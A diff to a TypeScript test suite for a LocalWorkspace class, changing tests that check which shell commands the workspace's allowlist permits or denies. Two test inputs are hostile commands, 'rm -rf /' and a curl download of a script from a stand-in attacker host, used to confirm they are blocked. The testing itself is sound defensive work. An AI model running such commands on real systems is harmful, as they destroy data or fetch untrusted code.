@@ -4,8 +4,12 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { randomUUID } from 'node:crypto'
 
-import { LocalWorkspace } from '../local-workspace.js'
-import { WorkspacePathSecurityError, type WorkspaceOptions } from '../types.js'
+import { DEFAULT_ALLOWED_COMMANDS, LocalWorkspace } from '../local-workspace.js'
+import {
+  WorkspaceCommandDeniedError,
+  WorkspacePathSecurityError,
+  type WorkspaceOptions,
+} from '../types.js'
 
 describe('LocalWorkspace', () => {
   let tempDir: string
@@ -169,22 +173,83 @@ describe('LocalWorkspace', () => {
     expect(result.stderr).toContain('does-not-exist.txt')
   })
 
-  it('runCommand blocks disallowed commands with exitCode 126', async () => {
-    const result = await ws.runCommand('rm', ['-rf', '/'])
-    expect(result.exitCode).toBe(126)
-    expect(result.stderr).toContain('not in the allowed commands list')
+  it('runCommand throws WorkspaceCommandDeniedError for disallowed commands', async () => {
+    await expect(ws.runCommand('rm', ['-rf', '/'])).rejects.toBeInstanceOf(
+      WorkspaceCommandDeniedError,
+    )
   })
 
-  it('runCommand defaults to a deny-all allowlist when no commands are configured', async () => {
-    const denyAllWorkspace = new LocalWorkspace({
+  it('runCommand falls back to DEFAULT_ALLOWED_COMMANDS when no allowlist is configured', async () => {
+    const defaultsWorkspace = new LocalWorkspace({
       rootDir: tempDir,
       search: { provider: 'builtin' },
     })
 
-    const result = await denyAllWorkspace.runCommand('echo', ['blocked'])
+    expect(defaultsWorkspace.options.command?.allowedCommands).toEqual([
+      ...DEFAULT_ALLOWED_COMMANDS,
+    ])
+  })
 
-    expect(result.exitCode).toBe(126)
-    expect(result.stderr).toContain('not in the allowed commands list')
+  it('runCommand denies networked binaries (curl) under the default allowlist', async () => {
+    const defaultsWorkspace = new LocalWorkspace({
+      rootDir: tempDir,
+      search: { provider: 'builtin' },
+    })
+
+    await expect(
+      defaultsWorkspace.runCommand('curl', ['https://evil.example/x.sh']),
+    ).rejects.toBeInstanceOf(WorkspaceCommandDeniedError)
+  })
+
+  it('runCommand allows git under the default allowlist (git status succeeds)', async () => {
+    const defaultsWorkspace = new LocalWorkspace({
+      rootDir: tempDir,
+      search: { provider: 'builtin' },
+      command: { timeoutMs: 5_000 },
+    })
+
+    // `git status` may exit non-zero (not a repo) but must NOT throw
+    // WorkspaceCommandDeniedError — it must be allowed past the gate.
+    const result = await defaultsWorkspace.runCommand('git', ['status'])
+    expect(result).toMatchObject({ timedOut: false })
+    expect(typeof result.exitCode).toBe('number')
+  })
+
+  it('runCommand allows curl when explicitly listed in allowedCommands', async () => {
+    const curlWorkspace = new LocalWorkspace({
+      rootDir: tempDir,
+      search: { provider: 'builtin' },
+      // `--help` is universally available and exits 0 across curl distros.
+      command: { timeoutMs: 5_000, allowedCommands: ['curl'] },
+    })
+
+    // We intentionally do not hit the network — `--help` is offline.
+    // The point of the test is that the allowlist gate does not deny `curl`.
+    let denied = false
+    try {
+      await curlWorkspace.runCommand('curl', ['--help'])
+    } catch (err) {
+      if (err instanceof WorkspaceCommandDeniedError) denied = true
+    }
+    expect(denied).toBe(false)
+  })
+
+  it("runCommand allows any command when allowedCommands is the '*' sentinel", async () => {
+    const wildcardWorkspace = new LocalWorkspace({
+      rootDir: tempDir,
+      search: { provider: 'builtin' },
+      command: { timeoutMs: 5_000, allowedCommands: '*' },
+    })
+
+    // `node --version` is allowed because of '*'; if the gate denied it we
+    // would see WorkspaceCommandDeniedError. We only care that it's not denied.
+    let denied = false
+    try {
+      await wildcardWorkspace.runCommand('node', ['--version'])
+    } catch (err) {
+      if (err instanceof WorkspaceCommandDeniedError) denied = true
+    }
+    expect(denied).toBe(false)
   })
 
   it('runCommand rejects cwd outside root', async () => {
